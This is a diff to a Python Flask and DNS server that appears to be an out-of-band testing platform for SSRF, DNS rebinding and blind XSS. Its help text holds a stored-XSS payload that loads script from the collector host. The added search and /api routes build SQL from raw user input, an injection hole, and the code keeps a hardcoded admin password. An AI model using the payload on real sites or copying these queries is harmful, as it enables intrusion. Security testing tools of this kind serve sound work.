@@ -13,6 +13,7 @@ import sqlite3
 import socket
 import sys
 import getopt
+import hashlib
 
 app = Flask(__name__)
 auth = HTTPBasicAuth()
@@ -21,6 +22,20 @@ DB = None
 REBIND_CACHE = []
 LOCAL_IP = ''
 PASSWORD = 'admin'
+
+def md5(src):
+    m2 = hashlib.md5()
+    m2.update(src)
+    return m2.hexdigest()
+
+def is_ip(ip):
+    p = re.compile('^((25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(25[0-5]|2[0-4]\d|[01]?\d\d?)$')
+    if p.match(ip):
+        return ip
+    else:
+        return '3.3.3.3'
+
+API_TOKEN = md5("ded08972cead38d6ed8f485e5b65b4b6" + PASSWORD)
 
 HTML_TMEPLATE = '''
 <!DOCTYPE html>
@@ -121,6 +136,15 @@ HTML_TMEPLATE = '''
                 }]
             });
         });
+        function send_ajax(url) {
+          $.get(url, function(data, status){
+            if(data.status == 1) {
+                alert('del ok');
+            }else{
+                alert('del fail');
+            }
+          });
+        }
     </script>
 </head>
 
@@ -131,6 +155,7 @@ HTML_TMEPLATE = '''
             <li><a href="#dnslog" data-toggle="tab">DNS Tools</a></li>
             <li><a href="#httplog" data-toggle="tab">HTTP Log</a></li>
             <li><a href="#xss" data-toggle="tab">XSS</a></li>
+            <li><a href="#other" data-toggle="tab">Other</a></li>
         </ul>
         <div id="myTabContent" class="tab-content">
             <div class="tab-pane fade in active" id="mock">
@@ -157,6 +182,7 @@ HTML_TMEPLATE = '''
                             <br> 2.<code>10.100.11.22.{domain}</code> 解析结果为 10.100.11.22，用于特殊的漏洞场景（例如某个ssrf限制了域名且判断存在问题，用这个可以方便的遍历内网资源）
                             <br> 3.<code>66.123.11.11.10.100.11.22.{domain}</code> 首次解析为66.123.11.11，第二次则解析为10.100.11.22，可用于DNS rebinding的漏洞测试
                         </p>
+                        <button type="button" class="btn btn-default" onclick="send_ajax('/del/dns')">清空DNS记录</button>
                     </div>
                     <table id="dnslog_table" style="word-break:break-all; word-wrap:break-all;">
                     </table>
@@ -170,6 +196,7 @@ HTML_TMEPLATE = '''
                             <br> 1.<code>http://httplog.{domain}/httplog/test</code>，httplog和mock路由下的任意HTTP请求均会记录详细的请求包，可用于各种无回显漏洞的判断、漏洞分析、信息收集、数据回传
                             <br>
                         </p>
+                        <button type="button" class="btn btn-default" onclick="send_ajax('/del/http')">清空HTTP记录</button>
                     </div>
                     <table id="httplog_table" style="word-break:break-all; word-wrap:break-all;">
                     </table>
@@ -181,8 +208,21 @@ HTML_TMEPLATE = '''
                         <p><b>使用帮助：</b><br> 用于测试储存型xss漏洞
                             <br> JS地址：http://x.{domain}/xss/test/js test可自定义，用于项目区分<br> 例如：<code>'"/>&lt;script src=http://x.{domain}/xss/test/js&gt;&lt;/script&gt;</code>
                         </p>
+                        <button type="button" class="btn btn-default" onclick="send_ajax('/del/http')">清空XSS记录</button>
                     </div>
                     <table id="xss_table" style="word-break:break-all; word-wrap:break-all;">
+                    </table>
+                </div>
+            </div>
+            <div class="tab-pane fade" id="other">
+                <div class="panel panel-default">
+                    <div class="panel-heading">
+                        <p><b>使用帮助：</b><br>
+                            <br> Token: {token}
+                            <br> http api: /api/http?token={token}&q=xxx
+                            <br> dns api: /api/dns?token={token}&q=xxx
+                        </p>
+                    </div>
                     </table>
                 </div>
             </div>
@@ -231,7 +271,7 @@ HTML_TMEPLATE = '''
 
 @auth.verify_password
 def verify_pw(username, password):
-    print(username, password)
+    #print(username, password)
     if username == 'admin' and password == PASSWORD:
         return 'true'
     return None
@@ -326,7 +366,8 @@ class DNSFrame:
         return _type, name, query_bytes
 
     def _get_answer_getbytes(self, ip):
-        answer_bytes = struct.pack('>HHHLH', 49164, 1, 1, 190, 4)
+        ttl = 0
+        answer_bytes = struct.pack('>HHHLH', 49164, 1, 1, ttl, 4)
         s = ip.split('.')
         answer_bytes = answer_bytes + struct.pack('BBBB', int(s[0]), int(s[1]),
                                                   int(s[2]), int(s[3]))
@@ -353,32 +394,36 @@ class DNSUDPHandler(SocketServer.BaseRequestHandler):
         a_map = DNSServer.A_map
         if (dns.query_type == 1):
             domain = dns.get_query_domain()
-            ip = '127.0.0.1'
-            if domain in a_map:
+
+            ip = '1.1.1.1'
+            pre_data = domain.replace('.' + ROOT_DOMAIN, '')
+
+            if pre_data in a_map:
                 # 自定义的dns记录，保留着
-                ip = a_map[domain]
-            elif domain.count('.') == 5:
+                ip = a_map[pre_data]
+            elif pre_data.count('.') == 3:
                 # 10.11.11.11.test.com 即解析为 10.11.11.11
-                ip = domain.replace('.' + ROOT_DOMAIN, '')
-            elif domain.count('.') == 9:
+                ip = is_ip(pre_data)
+            elif pre_data.count('.') == 7:
                 # 114.114.114.114.10.11.11.11.test.com 循环解析，例如第一次解析结果为114.114.114.114，第二次解析结果为10.11.11.11
-                tmp = domain.replace('.' + ROOT_DOMAIN, '').split('.')
+                tmp = pre_data.split('.')
                 ip_1 = '.'.join(tmp[0:4])
                 ip_2 = '.'.join(tmp[4:])
                 if tmp in REBIND_CACHE:
-                    ip = ip_2
+                    ip = is_ip(ip_2)
                     REBIND_CACHE.remove(tmp)
                 else:
                     REBIND_CACHE.append(tmp)
-                    ip = ip_1
+                    ip = is_ip(ip_1)
+
             if ROOT_DOMAIN in domain:
-                name = domain.replace('.' + ROOT_DOMAIN, '')
+                #name = domain.replace('.' + ROOT_DOMAIN, '')
                 sql = "INSERT INTO dns_log (name,domain,ip,insert_time) \
                     VALUES(?, ?, ?, datetime(CURRENT_TIMESTAMP,'localtime'))"
 
-                DB.exec_sql(sql, name, domain, ip)
+                DB.exec_sql(sql, pre_data, domain, ip)
             dns.setip(ip)
-            print '%s: %s-->%s' % (self.client_address[0], name, ip)
+            print '%s: %s-->%s' % (self.client_address[0], pre_data, ip)
             socket_u.sendto(dns.getbytes(), self.client_address)
         else:
             socket_u.sendto(data, self.client_address)
@@ -399,7 +444,7 @@ class DNSServer:
 @app.route('/')
 @auth.login_required
 def index():
-    return HTML_TMEPLATE.replace('{domain}', ROOT_DOMAIN), 200
+    return HTML_TMEPLATE.replace('{domain}', ROOT_DOMAIN).replace('{token}', API_TOKEN), 200
 
 
 @app.route('/dns')
@@ -410,8 +455,14 @@ def dns_list():
     args = request.values
     offset = int(args.get('offset', 0))
     limit = int(args.get('limit', 10))
-    sql = "SELECT domain,ip,insert_time FROM dns_log order by id desc limit {skip},{limit}".format(
-        skip=offset, limit=limit)
+
+    if args.get('search'):
+        search = args.get('search')
+    else:
+        search = ""
+
+    sql = "SELECT domain,ip,insert_time FROM dns_log where domain like '%{search}%' order by id desc limit {skip},{limit}".format(
+        skip=offset, limit=limit, search=search)
     rows = DB.exec_sql(sql)
     for v in rows:
         result.append({"domain": v[0], "ip": v[1], "insert_time": v[2]})
@@ -582,6 +633,57 @@ def xss_list():
     total = rows[0][0]
     return jsonify({'total': int(total), 'rows': result})
 
+@app.route('/del/<col>')
+@auth.login_required
+def del_data(col):
+    table = ''
+    if col == 'http':
+        table = 'http_log'
+    elif col == 'dns':
+        table = 'dns_log'
+    elif col == 'xss':
+        table = 'xss'
+    else:
+        return jsonify({'status': '0', 'msg': 'unkown table'})
+
+    sql = "Delete FROM {table}".format(table=table)
+    DB.exec_sql(sql)
+
+    return jsonify({'status':1})
+
+@app.route('/api/<action>')
+def api_check(action):
+    args = request.values
+
+    if not args.get('token') or args.get('token') != API_TOKEN:
+        return jsonify({'status':'0', 'msg':'error token'})
+
+    offset = int(args.get('offset', 0))
+    limit = int(args.get('limit', 10))
+    query = args.get('q', '')
+
+    result = []
+    if action == 'dns':
+        sql = "SELECT domain,ip,insert_time FROM dns_log where domain like '%{query}%' order by id desc limit {skip},{limit}".format(
+            skip=offset, limit=limit, query=query)
+        rows = DB.exec_sql(sql)
+        for v in rows:
+            result.append({"domain": v[0], "ip": v[1], "insert_time": v[2]})
+
+    elif action == 'http':
+        sql = "SELECT url,headers,data,ip,insert_time FROM http_log where url like '%{query}%' order by id desc limit {skip},{limit}".format(
+            skip=offset, limit=limit, query=query)
+        rows = DB.exec_sql(sql)
+        for v in rows:
+            result.append({'url': v[0], 'headers': v[1],
+                           'data': v[2], 'ip': v[3], 'insert_time': v[4]})
+    else:
+        return jsonify({'status': '0', 'msg': 'error action, plz http or dns'})
+
+    if result == []:
+        return jsonify({'status': '0', 'msg': 'no result'})
+    else:
+        return jsonify({'status': '1', 'rows': result})
 
 def dns():
     d = DNSServer()
